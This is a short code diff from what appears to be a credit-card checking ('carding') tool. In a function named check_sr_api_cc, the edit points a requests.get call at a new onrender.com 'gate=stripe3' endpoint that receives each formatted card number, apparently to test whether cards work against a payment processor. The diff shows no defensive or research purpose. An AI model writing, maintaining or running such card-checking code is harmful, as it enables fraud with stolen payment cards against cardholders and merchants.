@@ -8246,7 +8246,7 @@ def check_sr_api_cc(cc):
         # API request
         try:
             response = requests.get(
-                f"https://paypal-1-1bpd.onrender.com/gate=stripe3/keydarkwaslost/cc={formatted_cc}",
+                f"https://api-sr-storm.onrender.com/gate=stripe3/keydarkwaslost/cc={formatted_cc}",
                 timeout=120
             )
             if response.status_code == 200:
